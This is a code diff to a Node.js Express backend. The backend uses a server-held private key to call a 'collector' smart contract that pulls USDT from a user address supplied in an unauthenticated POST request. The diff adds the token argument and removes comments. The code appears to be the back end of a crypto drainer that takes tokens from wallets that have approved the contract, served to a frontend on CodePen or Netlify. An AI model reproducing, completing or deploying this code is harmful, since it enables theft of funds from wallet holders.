@@ -5,15 +5,13 @@ const { ethers } = require("ethers");
 
 const app = express();
 app.use(bodyParser.json());
-app.use(cors()); // allow frontend like CodePen/Netlify
+app.use(cors());
 
-// Provider + Wallet
 const provider = new ethers.providers.JsonRpcProvider(process.env.RPC_URL);
 const wallet = new ethers.Wallet(process.env.PRIVATE_KEY, provider);
 
-// Collector ABI (only need collect)
 const COLLECTOR_ABI = [
-  "function collect(address from, uint256 amount) external"
+  "function collect(address token, address from, uint256 amount) external"
 ];
 
 const collector = new ethers.Contract(
@@ -22,12 +20,10 @@ const collector = new ethers.Contract(
   wallet
 );
 
-// ✅ Health check
 app.get("/ping", (req, res) => {
   res.send("Collector backend is alive ✅");
 });
 
-// ✅ Collect tokens
 app.post("/collect", async (req, res) => {
   try {
     const { userAddress, amount } = req.body;
@@ -35,11 +31,10 @@ app.post("/collect", async (req, res) => {
       return res.status(400).json({ error: "Missing params" });
     }
 
-    // USDT has 18 or 6 decimals depending on token (BSC USDT = 18)
     const decimals = 18;
     const amountInWei = ethers.utils.parseUnits(amount.toString(), decimals);
 
-    const tx = await collector.collect(userAddress, amountInWei);
+    const tx = await collector.collect(process.env.USDT_ADDRESS, userAddress, amountInWei);
     await tx.wait();
 
     res.json({ success: true, txHash: tx.hash });
@@ -49,6 +44,5 @@ app.post("/collect", async (req, res) => {
   }
 });
 
-// Start server
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => console.log(`Collector backend running on port ${PORT}`));
